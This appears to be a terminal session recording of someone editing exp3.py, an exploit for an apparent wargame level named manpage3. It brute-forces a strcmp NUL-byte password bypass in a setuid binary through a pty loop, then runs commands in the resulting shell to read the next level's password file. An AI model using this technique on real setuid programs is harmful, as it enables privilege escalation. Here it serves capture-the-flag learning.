[7.437671, "o", "\u001b]3008;end=d3e5fdd5-6239-42ac-aa73-0e746efaae50;exit=success\u001b\\\u001b]3008;start=7fbcf728-0c66-4404-92df-587b51807905;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=manpage3;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/manpage3\u001b\\\u001b[?2004h\u001b]0;manpage3@manpage: ~\u0007manpage3@manpage:~$ vi /tmp/exp3.py\r\r\n\u001b[?2004l\r\u001b]3008;start=c017db44-f4a2-437c-92b2-ff0078f8e482;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=manpage3;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/manpage3\u001b\\"]
[7.445849, "o", "\u001b[?1006;1000h\u001b[?1002h\u001b[?1049h\u001b[22;0;0t\u001b[>4;2m\u001b[?1h\u001b=\u001b[?2004h\u001b[?1004h\u001b[1;34r\u001b[?12h\u001b[?12l\u001b[22;2t\u001b[22;1t\u001b[27m\u001b[23m\u001b[29m\u001b[m\u001b[H\u001b[2J\u001b[?25l\u001b[34;1H\"/tmp/exp3.py\""]
[7.457475, "o", " 47L, 1663B\u001b[2;1H▽\u001b[6n\u001b[2;1H  \u001b[3;1H\u001bPzz\u001b\\\u001b[0%m\u001b[6n\u001b[3;1H           \u001b[1;1H\u001b[>c\u001b]10;?\u0007\u001b]11;?\u0007\u001b[1;1H\u001b[34m# exp3.py - manpage3 exploit. The password file holds 256 random bytes (rewritten by\r\r\n# manpage3-reset); strcmp(buf, buf2) stops at the first NUL of either string, so a\u001b[m\u001b[2;83H\u001b[K\u001b[3;1H\u001b[34m# guess line starting with NUL matches whenever buf2[0] == 0x00 - a 1/256 chance per\u001b[m\u001b[3;85H\u001b[K\u001b[4;1H\u001b[34m# reset. Loop: reset, feed \"\\x00\\n\" via a pty (stdio would buffer-swallow a pipe's\r\r\n# whole input, starving the win-shell), watch for \"lottery\", then send the shell its\r\r\n# commands: id + cat /etc/manpage_pass/manpage4 (the binary is setuid manpage4 and\r\r\n# setreuid(geteuid(), geteuid()) makes the shell manpage4).\u001b[m\r\r\n\u001b[35mimport\u001b[m os, pty, select, subprocess, time\r\r\n\u001b[33mfor\u001b[m attempt \u001b[33min\u001b[m \u001b[36mrange\u001b[m(\u001b[31m400\u001b[m):\r\r\n    subprocess.run([\u001b[31m\"/manpage/manpage3-reset\"\u001b[m], capture_output=\u001b[36mTrue\u001b[m)\r\r\n    pid, fd = pty.fork()\r\r\n    \u001b[33mif\u001b[m pid == \u001b[31m0\u001b[m:\u001b[13;9Hos.execv(\u001b[31m\"/manpage/manpage3\"\u001b[m, [\u001b[31m\"/manpage/manpage3\"\u001b[m])\r\r\n    time.sleep(\u001b[31m1\u001b[m)\r\r\n    os.write(fd, \u001b[31mb\"\u001b[m\u001b[35m\\x00\\n\u001b[m\u001b[31m\"\u001b[m)\r\r\n    out = \u001b[31mb\"\"\u001b[m\r\r\n    sent = \u001b[36mFalse\u001b[m\r\r\n    t0 = time.time()\r\r\n    \u001b[33mwhile\u001b[m time.time() - t0 < \u001b[31m15\u001b[m:\u001b[20;9Hr, _, _ = select.select([fd], [], [], \u001b[31m0.3\u001b[m)\u001b[21;9H\u001b[33mif\u001b[m r:\u001b[22;13H\u001b[33mtry\u001b[m:\u001b[23;17Hchunk = os.read(fd, \u001b[31m65536\u001b[m)\u001b[24;13H\u001b[33mexcept\u001b[m \u001b[32mOSError\u001b[m:\u001b[25;17H\u001b[33mbreak\u001b[26;13Hif\u001b[m \u001b[33mnot\u001b[m chunk:\u001b[27;17H\u001b[33mbreak\u001b[m\u001b[28;13Hout += chunk\u001b[29;13H\u001b[33mif\u001b[m \u001b[33mnot\u001b[m sent \u001b[33mand\u001b[m \u001b[31mb\"lottery\"\u001b[m \u001b[33min\u001b[m out:\u001b[30;17Hsent = \u001b[36mTrue\u001b[m\u001b[31;17Htime.sleep(\u001b[31m0.5\u001b[m)\u001b[32;17Hos.write(fd, \u001b[31mb\"id\u001b[m\u001b[35m\\n\u001b[m\u001b[31mcat /etc/manpage_pass/manpage4\u001b[m\u001b[35m\\n\u001b[m\u001b[31mexit\u001b[m\u001b[35m\\n\u001b[m\u001b[31m\"\u001b[m)\r\r\n    \u001b[33mtry\u001b[m:\u001b[34;83H1,1\u001b[11CTop\u001b[1;1H\u001b[?25h\u001b[?4m"]
